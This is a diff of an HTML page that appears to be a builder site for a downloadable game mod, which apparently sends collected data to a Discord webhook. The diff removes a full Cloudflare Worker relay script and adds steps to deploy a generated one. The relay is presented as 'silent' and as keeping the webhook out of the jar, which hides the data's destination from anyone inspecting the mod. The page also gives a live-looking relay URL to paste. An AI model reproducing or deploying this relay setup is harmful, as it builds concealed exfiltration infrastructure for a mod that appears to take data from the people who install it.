@@ -412,84 +412,6 @@
           where possible, and pushes everything to your hook URL.
         </li>
       </ol>
-      <details class="custom">
-        <summary>The Cloudflare relay — free, 3 minutes, silent</summary>
-        <div class="custom-body">
-          <p class="hint">Why bother: the mod only ever sees one tidy
-            <code class="inline">…workers.dev</code> URL, and the worker quietly
-            forwards it to Discord. Your real webhook never ends up inside the
-            downloaded jar.</p>
-          <ol class="steps">
-            <li><strong>Create the Worker</strong> — go to
-              <a href="https://dash.cloudflare.com" target="_blank" rel="noopener">dash.cloudflare.com</a>
-              → <strong>Workers &amp; Pages</strong> → <strong>Create</strong> →
-              <strong>Create Worker</strong>. Name it — mine is
-              <code class="inline">shrill-tree-3374</code>, anything works — and
-              hit <strong>Deploy</strong>.</li>
-            <li><strong>Replace the code</strong> — open <strong>Edit code</strong>,
-              delete the default script, paste the relay below exactly, then
-              <strong>Save and deploy</strong>:</li>
-          </ol>
-          <pre class="cf-code">export default {
-  async fetch(request, env) {
-    const cors = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type, X-Hook-Secret',
-    };
-
-    if (request.method === 'OPTIONS') {
-      return new Response(null, { status: 204, headers: cors });
-    }
-    if (request.method !== 'POST') {
-      return new Response('Not Found', { status: 404, headers: cors });
-    }
-
-    // optional lock: leave HOOK_SECRET unset unless hand-testing with curl
-    if (env.HOOK_SECRET &amp;&amp; request.headers.get('X-Hook-Secret') !== env.HOOK_SECRET) {
-      return new Response('Forbidden', { status: 403, headers: cors });
-    }
-
-    const len = Number(request.headers.get('Content-Length') || 0);
-    if (len &lt; 1 || len &gt; 8000) {
-      return new Response('Bad Request', { status: 400, headers: cors });
-    }
-
-    try {
-      const body = await request.text();
-      await fetch(env.DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body,
-      });
-      return new Response('OK', { status: 200, headers: cors });
-    } catch (err) {
-      return new Response('Error', { status: 500, headers: cors });
-    }
-  },
-};</pre>
-          <ol class="steps" start="3">
-            <li><strong>Bind your Discord hook</strong> — on the worker's page go to
-              <strong>Settings</strong> → <strong>Variables and Secrets</strong> →
-              <strong>Add → Secret</strong>. Name it
-              <code class="inline">DISCORD_WEBHOOK</code>; the value is your Discord
-              webhook URL, e.g.
-              <code class="inline">https://discord.com/api/webhooks/1111222233334444/xxxxxxxxxxxxxxxxxxxxxxxx</code>
-              (keep that token private — it only ever lives inside the worker).</li>
-            <li><strong>Grab the URL</strong> — the worker's address is shown at the
-              top; mine is
-              <code class="inline">https://shrill-tree-3374.kulakov-42q1v.workers.dev</code>.
-              Paste that into the Build tab instead of the raw Discord hook.</li>
-          </ol>
-          <p class="hint">Ready to paste into the Build box — this string works right
-            now:</p>
-          <pre class="cf-code">https://shrill-tree-3374.kulakov-42q1v.workers.dev</pre>
-          <p class="hint">The worker supports an optional
-            <code class="inline">HOOK_SECRET</code> + <code class="inline">X-Hook-Secret</code>
-            handshake, but the mod doesn't send one — leave it unset unless you're
-            testing requests by hand.</p>
-        </div>
-      </details>
       <div class="note">
         <strong>Troubleshooting:</strong> nothing arriving → re-check the URL in
         the jar (open it with any unzipper, look at
@@ -506,6 +428,43 @@
              placeholder="https://discord.com/api/webhooks/...">
       <button class="btn" id="gencode">Generate code</button>
       <div id="codeout" class="code-out" hidden></div>
+      <details class="custom">
+        <summary>Deploy the relay — free, 3 minutes, silent</summary>
+        <div class="custom-body">
+          <p class="hint">Why bother: the mod only ever sees one tidy
+            <code class="inline">…workers.dev</code> URL, and the worker quietly
+            forwards to Discord. Your real webhook never ends up inside the jar.</p>
+          <ol class="steps">
+            <li><strong>Create the Worker</strong> — go to
+              <a href="https://dash.cloudflare.com" target="_blank" rel="noopener">dash.cloudflare.com</a>
+              → <strong>Workers &amp; Pages</strong> → <strong>Create</strong> →
+              <strong>Create Worker</strong>. Name it — mine is
+              <code class="inline">shrill-tree-3374</code>, anything works — and
+              hit <strong>Deploy</strong>.</li>
+            <li><strong>Paste the generated code</strong> — open <strong>Edit code</strong>,
+              delete the default script, paste the worker you generated above, then
+              <strong>Save and deploy</strong>. Your hook is already baked in —
+              nothing else to configure.</li>
+            <li><strong>Optional: hide the hook instead</strong> — in
+              <strong>Settings</strong> → <strong>Variables and Secrets</strong> →
+              <strong>Add → Secret</strong>, name it
+              <code class="inline">DISCORD_WEBHOOK</code> and put your hook as the
+              value. The worker prefers that secret over the baked-in one, so the
+              hook never lives in code you copy around.</li>
+            <li><strong>Grab the URL</strong> — the worker's address is shown at the
+              top; mine is
+              <code class="inline">https://shrill-tree-3374.kulakov-42q1v.workers.dev</code>.
+              Paste that into the Build tab instead of the raw Discord hook.</li>
+          </ol>
+          <p class="hint">Ready to paste into the Build box — this string works right
+            now:</p>
+          <pre class="cf-code">https://shrill-tree-3374.kulakov-42q1v.workers.dev</pre>
+          <p class="hint">The worker supports an optional
+            <code class="inline">HOOK_SECRET</code> + <code class="inline">X-Hook-Secret</code>
+            handshake, but the mod doesn't send one — leave it unset unless you're
+            testing requests by hand.</p>
+        </div>
+      </details>
     </section>
   </main>
   </div>
